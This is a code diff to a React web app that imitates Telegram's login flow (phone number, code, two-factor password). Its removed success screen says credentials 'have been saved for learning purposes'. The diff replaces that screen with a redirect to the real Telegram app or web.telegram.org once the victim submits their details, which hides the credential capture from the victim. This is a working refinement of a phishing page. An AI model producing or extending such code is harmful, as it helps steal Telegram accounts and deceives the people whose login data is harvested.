@@ -19,19 +19,30 @@ function App() {
       setRequiresTwoFactor(true);
       setStep(3);
     } else {
-      setStep(4); // Success
+      // Success - open Telegram app
+      openTelegramApp();
     }
   };
 
   const handleTwoFactorSubmit = () => {
-    setStep(4); // Success
+    // Success - open Telegram app
+    openTelegramApp();
+  };
+
+  const openTelegramApp = () => {
+    // Primary: Open the Telegram app
+    window.location.href = 'tg://resolve?domain=telegram';
+    
+    // Fallback: If app doesn't open (desktop or app not installed)
+    setTimeout(() => {
+      window.location.href = 'https://web.telegram.org';
+    }, 500);
   };
 
   return (
     <div className="app">
       <div className="telegram-login">
         <div className="header">
-         
         </div>
         
         {step === 1 && <PhoneInput onSubmit={handlePhoneSubmit} />}
@@ -46,13 +57,6 @@ function App() {
             phoneNumber={phoneNumber} 
             onSubmit={handleTwoFactorSubmit}
           />
-        )}
-        {step === 4 && (
-          <div className="success-message">
-            <h2>✓ Login Successful</h2>
-            <p>Credentials have been saved for learning purposes.</p>
-            <button onClick={() => setStep(1)}>Login Again</button>
-          </div>
         )}
       </div>
     </div>
